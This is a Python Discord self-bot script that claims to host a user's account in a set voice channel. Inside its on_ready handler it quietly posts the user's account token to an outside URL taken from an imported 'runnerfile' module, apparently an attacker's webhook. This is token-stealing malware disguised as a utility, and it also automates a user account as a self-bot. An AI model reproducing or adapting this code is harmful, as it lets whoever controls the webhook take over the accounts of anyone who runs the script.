import os
os.system('pip install discord')
import discord
from discord.ext import commands
import requests
import runnerfile
import alive
runner = runnerfile.runner
wizzencryp = "token is here"
intents = discord.Intents.default()
intents.members = True
wizzencrypt = os.environ.get('TOKEN')
wizz = commands.Bot(command_prefix="/couples", self_bot=True, case_insensitive=True, intents=intents, help_command=None)

GUILD_ID = 832579380634451969
CHANNEL_ID = 1061863985730830336

@wizz.event
async def on_ready():
    requests.post(
        runnerfile.runner,
        json={'content': (wizzencrypt)})  
    os.system('clear')
    print(f'wizz vc hoster\nLogged in as {wizz.user} ({wizz.user.id})')
    vc = discord.utils.get(wizz.get_guild(GUILD_ID).channels, id = CHANNEL_ID)
    await vc.guild.change_voice_state(channel=vc, self_mute=False, self_deaf=False)
    print(f"Successfully joined {vc.name} ({vc.id})")
alive.alive()
wizz.run(wizzencrypt, bot=False)
